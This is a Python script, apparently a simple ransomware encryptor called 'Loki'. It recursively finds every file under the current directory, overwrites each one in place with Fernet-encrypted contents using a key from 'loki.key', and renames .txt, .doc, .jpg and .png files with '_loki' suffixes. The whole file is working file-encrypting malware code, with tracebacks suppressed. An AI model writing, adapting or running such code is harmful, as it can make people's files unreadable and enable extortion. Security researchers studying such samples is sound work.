# Imports.
import sys
import os
from pathlib import Path
from cryptography.fernet import Fernet
from colorama import Fore # For text colour.

# Hide tracebacks - change to 1 for dev mode.
sys.tracebacklimit = 0

# Discovery.
files = [] # Creates a files array.

def findFiles(path):
    dirs = [] # Creates a directory array.
    print("---> source dir |", path) # Prints when it hits a source for new sub-directories.
    for file in os.listdir(path):
        filePath = path + "/" + file
        if file == "encryptor.py" or file == "decryptor.py" or file == "loki.key":
            continue

        if not os.path.isfile(filePath):
            dirs.append(filePath)
            continue

        print("--> Found file |", filePath) # Prints when it finds an individual file.
        files.append(filePath)

    if dirs == []:
        return # No dirs

    for dirPath in dirs:
        print("-! Found sub-dir  |", dirPath) # Prints when it finds a sub-directory of a source.
        findFiles(dirPath)

# Encrypt/Decrypt handler.
def handleFile(filePath, key, action):
    with open(filePath, "rb") as file:
        contents = file.read()

    if action.lower() == "e":
        contents = Fernet(key).encrypt(contents)
        message = "Encrypted"
    elif action.lower() == "d":
        contents = Fernet(key).decrypt(contents)
        message = "Decrypted"
    else:
        print(f"{action} is not a valid file action")
        return

    with open(filePath, "wb") as file:
        file.write(contents)
        print(message, "|", filePath)

# Functions.
def encrypt():
    with open("loki.key", "rb") as loki_key:
        key = loki_key.read()

    # encrypt files
    for filePath in files:
        handleFile(filePath, key, "e")

        for filename in os.listdir(os.path.dirname(os.path.abspath(__file__))):
            base_file, ext = os.path.splitext(filename) # Adds loki extension manipulation.
            if ext == ".loki":
                os.rename(filename, base_file + "")
            if ext == ".txt":
                os.rename(filename, base_file + ".txt_loki")
            if ext == ".doc":
                os.rename(filename, base_file + ".doc_loki")
            if ext == ".jpg":
                os.rename(filename, base_file + ".jpg_loki")
            if ext == ".png":
                os.rename(filename, base_file + ".png_loki")
#        print(f"\n[!] {Fore.YELLOW}Errno2 {Fore.WHITE} - This is a bug and can be ignored")

def encryptor():
    # Find files in current dir, and sub dirs
    findFiles(".")
    encrypt()
    return

if __name__ == '__main__':
    encryptor()